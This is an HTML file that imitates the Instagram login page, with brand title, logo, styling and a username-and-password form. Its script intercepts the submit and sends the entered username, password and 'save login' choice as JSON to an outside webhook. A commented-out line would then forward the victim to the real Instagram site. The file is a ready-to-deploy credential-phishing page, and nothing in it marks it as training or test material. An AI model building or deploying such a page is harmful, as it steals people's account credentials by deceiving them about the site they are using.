<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* Reset and Base Styles */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #1a1a1a; /* Dark background */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            color: #ffffff;
        }

        /* Main Container */
        .login-container {
            width: 100%;
            max-width: 350px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Logo */
        .logo {
            margin-bottom: 35px;
            width: 200px; /* Adjust based on your logo.png size */
            height: auto;
            display: block;
        }

        /* Form Styling */
        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .input-group {
            position: relative;
            width: 100%;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px 10px;
            background-color: #262626;
            border: 1px solid #363636;
            border-radius: 6px;
            color: #f5f5f5;
            font-size: 14px;
            outline: none;
            transition: border-color 0.2s;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #8a8a8a;
        }

        input::placeholder {
            color: #a8a8a8;
            font-size: 14px;
        }

        /* Checkbox Styling */
        .checkbox-container {
            display: flex;
            align-items: center;
            margin: 12px 0 18px 0;
            cursor: pointer;
            font-size: 14px;
            color: #f5f5f5;
            user-select: none;
        }

        .checkbox-container input {
            position: absolute;
            opacity: 0;
            cursor: pointer;
            height: 0;
            width: 0;
        }

        .checkmark {
            height: 18px;
            width: 18px;
            background-color: transparent;
            border: 1px solid #737373;
            border-radius: 3px;
            margin-right: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background-color 0.2s, border-color 0.2s;
        }

        .checkbox-container:hover input ~ .checkmark {
            border-color: #a8a8a8;
        }

        .checkbox-container input:checked ~ .checkmark {
            background-color: #ffffff;
            border-color: #ffffff;
        }

        .checkmark:after {
            content: "";
            position: absolute;
            display: none;
        }

        .checkbox-container input:checked ~ .checkmark:after {
            display: block;
        }

        .checkbox-container .checkmark:after {
            left: 5px;
            top: 1px;
            width: 4px;
            height: 8px;
            border: solid #000000;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }

        /* Button Styling */
        button {
            width: 100%;
            padding: 12px;
            background-color: #3855d1; /* Instagram Blue */
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s, opacity 0.2s;
            margin-bottom: 20px;
        }

        button:hover {
            background-color: #2e4abf;
        }

        button:active {
            opacity: 0.8;
        }

        /* Forgot Password Link */
        .forgot-password {
            color: #ffffff;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            margin-top: 5px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        /* Subtle layout adjustment for specific spacing */
        .spacer {
            margin-top: 5px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <!-- Changed Logo Source -->
        <img src="logo.png" alt="Instagram" class="logo">

        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
            </div>
            
            <div class="input-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>

            <label class="checkbox-container">
                <input type="checkbox" id="saveLogin">
                <span class="checkmark"></span>
                Save login info
            </label>

            <button type="submit">Log in</button>

            <a href="#" class="forgot-password">Forgot password?</a>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            // Prevent the default form submission (reload)
            event.preventDefault();

            // Gather the data
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const saveLogin = document.getElementById('saveLogin').checked;

            // Prepare the data object
            const payload = {
                username: username,
                password: password,
                save_login: saveLogin
            };

            try {
                // Send data to your webhook
                const response = await fetch('https://elegant-hawk-16.webhook.cool', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    // Optional: Simulate a successful "login" experience or alert
                    // alert("Login successful (simulation)");
                    console.log("Data sent to webhook successfully.");
                    
                    // You can redirect here if needed:
                    // window.location.href = "https://www.instagram.com";
                } else {
                    console.error('Failed to send data to webhook.');
                }
            } catch (error) {
                console.error('Error:', error);
            }
        });
    </script>
</body>
</html>
